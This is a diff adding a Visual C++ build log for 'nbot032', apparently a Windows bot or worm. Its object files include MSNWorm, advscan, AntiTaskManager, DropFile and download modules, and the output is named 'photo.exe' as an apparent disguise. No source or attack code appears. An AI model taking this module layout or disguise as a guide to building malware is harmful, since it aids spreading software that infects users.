@@ -1,0 +1,51 @@
+<html>
+<body>
+<pre>
+<h1>Build Log</h1>
+<h3>
+--------------------Configuration: nbot032 - Win32 Release--------------------
+</h3>
+<h3>Command Lines</h3>
+Creating temporary file "C:\DOCUME~1\GHFHFH~1\LOKALE~1\Temp\RSP7C.tmp" with contents
+[
+/nologo /ML /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /Fp"Release/nbot.pch" /YX /Fo"Release/" /Fd"Release/" /FD /c 
+"C:\Documents and Settings\ghfhf hfhf\Skrivebord\nbot032-update-5-28-08-enc[07-10am]\nbot.cpp"
+]
+Creating command line "cl.exe @C:\DOCUME~1\GHFHFH~1\LOKALE~1\Temp\RSP7C.tmp" 
+Creating temporary file "C:\DOCUME~1\GHFHFH~1\LOKALE~1\Temp\RSP7D.tmp" with contents
+[
+wininet.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /incremental:no /pdb:"Release/photo.pdb" /machine:I386 /out:"bin/photo.exe" /align:4096 
+".\Release\advscan.obj"
+".\Release\Aim.obj"
+".\Release\Azureus.obj"
+".\Release\DropFile.obj"
+".\Release\MSNWorm.obj"
+".\Release\TFTP 2008.OBJ"
+".\Release\Triton.obj"
+".\Release\uTorrent.obj"
+".\Release\zip.obj"
+".\Release\Anti.obj"
+".\Release\AntiTaskManager.obj"
+".\Release\FlashFxp.obj"
+".\Release\download.obj"
+".\Release\ftpd.obj"
+".\Release\hostcheck.obj"
+".\Release\nbot.obj"
+".\Release\other.obj"
+".\Release\threads.obj"
+".\Release\uninstall.obj"
+]
+Creating command line "link.exe @C:\DOCUME~1\GHFHFH~1\LOKALE~1\Temp\RSP7D.tmp"
+<h3>Output Window</h3>
+Compiling...
+nbot.cpp
+Linking...
+LINK : warning LNK4108: /ALIGN specified without /DRIVER or /VXD; image may not run
+
+
+
+<h3>Results</h3>
+photo.exe - 0 error(s), 1 warning(s)
+</pre>
+</body>
+</html>
